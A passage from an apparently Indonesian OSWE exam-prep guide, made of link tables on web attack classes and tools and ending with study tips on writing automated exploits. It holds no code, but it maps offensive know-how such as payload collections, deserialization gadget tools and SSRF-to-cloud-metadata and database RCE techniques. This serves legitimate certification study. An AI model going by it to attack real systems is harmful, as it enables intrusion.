| 34 | Type Juggling Authentication Bypass | https://medium.com/@jaimedelgado/ |
| 35 | PHP Type Juggling — HackTricks | https://book.hacktricks.wiki/en/generic-hacking/php-type-juggling.html |

### SQL Injection & Database Exploitation

| # | Resource | URL |
|---|----------|-----|
| 36 | SQL Injection — PortSwigger | https://portswigger.net/web-security/sql-injection |
| 37 | PostgreSQL COPY FROM PROGRAM RCE | https://www.postgresql.org/docs/current/sql-copy.html |
| 38 | H2 Database RCE — CREATE ALIAS | https://mthbernardes.github.io/pentesting/2018/02/05/h2db-rce.html |
| 39 | PostgreSQL UDF RCE | https://book.hacktricks.wiki/en/pentesting-web/sql-injection/postgresql-injection.html |
| 40 | Blind SQL Injection — OWASP | https://cheatsheetseries.owasp.org/cheatsheets/Blind_SQL_Injection_Cheat_Sheet.html |
| 41 | SQL Injection Cheat Sheet — NetSPI | https://sqlwiki.netspi.com/ |
| 42 | Out-of-Band SQL Injection — HackTricks | https://book.hacktricks.wiki/en/pentesting-web/sql-injection/ |
| 43 | Time-Based SQLi — PentestMonkey | https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet |
| 44 | Hibernate ORM Injection | https://book.hacktricks.wiki/en/pentesting-web/sql-injection/hibernate-injection.html |
| 45 | Entity Framework Raw SQL Injection | https://learn.microsoft.com/en-us/ef/core/querying/raw-sql |

### SSTI (Server-Side Template Injection)

| # | Resource | URL |
|---|----------|-----|
| 46 | SSTI — PortSwigger Academy | https://portswigger.net/web-security/server-side-template-injection |
| 47 | SSTI — HackTricks | https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/ |
| 48 | Jinja2 SSTI — PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection |
| 49 | FreeMarker SSTI — PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings/ |
| 50 | Twig SSTI — HackTricks | https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/ |
| 51 | Handlebars SSTI RCE — research | https://blog.shoebpatel.com/ |
| 52 | Jade/Pug SSTI | https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/ |
| 53 | SSTI Cheat Sheet — PayloadBox | https://github.com/payloadbox/ssti-payloads |

### SSRF (Server-Side Request Forgery)

| # | Resource | URL |
|---|----------|-----|
| 54 | SSRF — PortSwigger Academy | https://portswigger.net/web-security/ssrf |
| 55 | SSRF — HackTricks | https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/ |
| 56 | SSRF to Cloud Metadata — PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery |
| 57 | SSRF via DNS Rebinding | https://github.com/nZEDly/DNS-rebinding |
| 58 | AWS EC2 Metadata Service | https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html |
| 59 | GCP Metadata Service | https://cloud.google.com/compute/docs/metadata/overview |
| 60 | Azure Instance Metadata Service | https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service |
| 61 | SSRF to RCE via Redis + gopher | https://www.melvinboers.com/ |
| 62 | Blind SSRF Detection | https://portswigger.net/burp/documentation/collaborator |

### Prototype Pollution

| # | Resource | URL |
|---|----------|-----|
| 63 | Prototype Pollution — PortSwigger | https://portswigger.net/web-security/prototype-pollution |
| 64 | Prototype Pollution — HackTricks | https://book.hacktricks.wiki/en/pentesting-web/prototype-pollution/ |
| 65 | Prototype Pollution — PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution |
| 66 | Server-Side Prototype Pollution — Research | https://research.securitum.com/prototype-pollution-and-bypassing-client-side-filters/ |
| 67 | Prototype Pollution Detection Tool | https://github.com/BlackFan/pp-detector |
| 68 | CVE-2019-10744 — lodash PP | https://snyk.io/vuln/SNYK-JS-LODASH-450202 |
| 69 | CVE-2020-8203 — lodash PP | https://snyk.io/vuln/SNYK-JS-LODASH-590103 |
| 70 | CVE-2025-55182 — npm PP | (check NVD) |
| 71 | CVE-2025-66478 — Node.js PP | (check NVD) |

### XXE (XML External Entity)

| # | Resource | URL |
|---|----------|-----|
| 72 | XXE — PortSwigger Academy | https://portswigger.net/web-security/xxe |
| 73 | XXE — OWASP Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html |
| 74 | XXE — HackTricks | https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-injection.html |
| 75 | Blind XXE Detection & Exploitation | https://blog.netspi.com/ |
| 76 | XXE in Java — Prevention | https://www.oracle.com/java/technologies/javase/xml.html |

### Java Security & Exploitation

| # | Resource | URL |
|---|----------|-----|
| 77 | ysoserial — Java Deserialization | https://github.com/frohoff/ysoserial |
| 78 | Java Deserialization — HackTricks | https://book.hacktricks.wiki/en/pentesting-web/deserialization/java-deserialization.html |
| 79 | JWT Attacks — HackTricks | https://book.hacktricks.wiki/en/pentesting-web/jwt-json-web-token-attacks.html |
| 80 | JWT Algorithm Confusion — PortSwigger | https://portswigger.net/web-security/jwt/algorithm-confusion |
| 81 | Java RCE via Runtime.exec() | https://book.hacktricks.wiki/en/generic-hacking/ |

### Node.js Exploitation

| # | Resource | URL |
|---|----------|-----|
| 82 | Node.js Deserialization — HackTricks | https://book.hacktricks.wiki/en/pentesting-web/deserialization/node-js-deserialization.html |
| 83 | Node.js SSTI — PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings/ |
| 84 | Node.js Sandbox Escape | https://podalirius.net/en/articles/ |
| 85 | WebSocket Penetration Testing | https://rayoflightz.medium.com/ |

### OSWE Preparation & Practice

| # | Resource | URL |
|---|----------|-----|
| 86 | OSWE-Prep — GitHub (Xcatolin) | https://github.com/Xcatolin/OSWE-Prep |
| 87 | OSWE-Prep — GitHub (snoopysecurity) | https://github.com/snoopysecurity/OSWE-Prep |
| 88 | OSWE Lab Practice Guide | https://www.abatchy.com/ |
| 89 | Web Security Academy (PortSwigger) | https://portswigger.net/web-security |
| 90 | PentesterLab — Web Challenges | https://pentesterlab.com/ |
| 91 | HackTheBox — Web Challenges | https://www.hackthebox.com/ |
| 92 | TryHackMe — Web Fundamentals | https://tryhackme.com/ |

### Tools

| # | Resource | URL |
|---|----------|-----|
| 93 | Burp Suite Community | https://portswigger.net/burp/communitydownload |
| 94 | dnSpy (.NET Debugger) | https://github.com/dnSpy/dnSpy |
| 95 | JD-GUI (Java Decompiler) | https://java-decompiler.github.io/ |
| 96 | Jadx (Java Decompiler) | https://github.com/skylot/jadx |
| 97 | ysoserial (Java Gadgets) | https://github.com/frohoff/ysoserial |
| 98 | ysoserial.net (.NET Gadgets) | https://github.com/pwntester/ysoserial.net |
| 99 | Python Requests Library | https://docs.python-requests.org/ |
| 100 | Python websocket-client | https://github.com/websocket-client/websocket-client |
| 101 | interactsh (OOB Server) | https://github.com/projectdiscovery/interactsh |
| 102 | ngrok (Tunneling) | https://ngrok.com/ |

### Communities & Video

| # | Resource | Focus | URL |
|---|----------|-------|-----|
| 103 | OffSec Discord | OSWE discussion, Q&A | https://discord.gg/offsec |
| 104 | OffSec Community Forums | Exam prep, tips | https://forums.offsec.com |
| 105 | r/OSWE Reddit | OSWE community | https://reddit.com/r/oswe |
| 106 | 0xdf GitLab | Walkthroughs, methodology | https://0xdf.gitlab.io/ |
| 107 | IppSec YouTube | HTB, general methodology | https://www.youtube.com/@ippsec |
| 108 | John Hammond YouTube | Web exploitation, CTF | https://www.youtube.com/@_JohnHammond |
| 109 | STÖK YouTube | Web security, bug bounty | https://www.youtube.com/@stokfredrik |
| 110 | InsiderPhD YouTube | Web app security, research | https://www.youtube.com/@InsiderPhD |
| 111 | PwnFunction YouTube | Web exploitation | https://www.youtube.com/@PwnFunction |
| 112 | The Cyber Mentor YouTube | Web app pentesting | https://www.youtube.com/@TCMSecurityAcademy |
| 113 | HackTricks | Pentesting methodology | https://book.hacktricks.wiki/ |
| 114 | PayloadsAllTheThings | Pentesting payloads | https://github.com/swisskyrepo/PayloadsAllTheThings |

---

> **Catatan Akhir**: OSWE adalah salah satu sertifikasi web application tersulit di industri — membutuhkan kemampuan membaca dan memahami source code dalam 5 bahasa (Java, C#, PHP, Python, JavaScript) dan menulis exploit Python yang fully automated. Kunci sukses:
> 1. **Kuasai source code review** — cari vulnerable patterns dengan cepat
> 2. **Pahami gadget chains** — .NET deserialization, Java ysoserial, prototype pollution gadgets
> 3. **Exploit Python harus clean** — fully automated, no hardcoded sessions
> 4. **Report adalah 85/100 minimum** — dokumentasi setiap langkah exploit
> 5. **Praktik, praktik, praktik** — kerjakan semua Challenge Labs sampai exploit jalan tanpa error
>
> Ingat: "Source code is the ultimate documentation. Everything you need to exploit the application is right there."
